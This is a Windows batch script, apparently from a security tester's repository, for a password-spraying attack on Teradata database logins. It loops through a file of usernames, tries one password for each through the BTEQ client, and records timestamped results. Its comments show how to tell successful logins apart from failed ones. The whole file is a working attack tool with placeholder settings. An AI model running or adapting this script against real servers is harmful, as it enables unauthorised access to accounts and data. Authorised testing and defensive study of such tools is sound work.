@echo off
rem teradata-login.bat by Ted R (github: actuated)
rem Created 10/3/2016, Last Modified 10/5/2016
rem
rem Simple login script for Teradata, using BTEQ.
rem Note that successful logins will hang, waiting for a BTEQ command. Time
rem stamps have been provided to make this easy to notice. You can then enter
rem the .QUIT command to end that iteration of the FOR loop and continue the
rem login attack.
rem
rem Failed login: *** Failure 8017 The UserId, Password or Account is invalid.
rem Successful login: *** Logon successfully completed.
rem
rem 10/4/2016 - Added delayed expansion for timestamp within for loop.
rem 10/5/2016 - Added user/pass attempt timestamp to output file.

set strINFILE=***SETME***
set strOUTFILE=***SETME***
set strSERVER=***SETME***
set strPASS=***SETME***

setlocal EnableDelayedExpansion

echo.
echo ================[ teradata-login.bat - Ted R (github: actuated) ]================
if exist %strOUTFILE% (
	echo.
	echo FYI: %strOUTFILE% already exists. Continue to append, or Ctrl+C to exit.
	PAUSE
)
echo.
echo. >> %strOUTFILE%
echo Started: %date% %time%
echo Started: %date% %time% >> %strOUTFILE%
echo.

for /f %%i in (%strINFILE%) do (
	echo !time!: %%i:%strPASS%
	echo. >> %strOUTFILE%
	echo ######## !time!: %%i:%strPASS% ######## >> %strOUTFILE%
	bteq .LOGON %strSERVER%/%%i,%strPASS%^;ABORT^;.QUIT >> %strOUTFILE% 2>NUL
)

echo.
echo. >> %strOUTFILE%
echo Done: %date% %time%
echo Done: %date% %time% >> %strOUTFILE%
echo.
echo =====================================[ fin ]=====================================
echo.
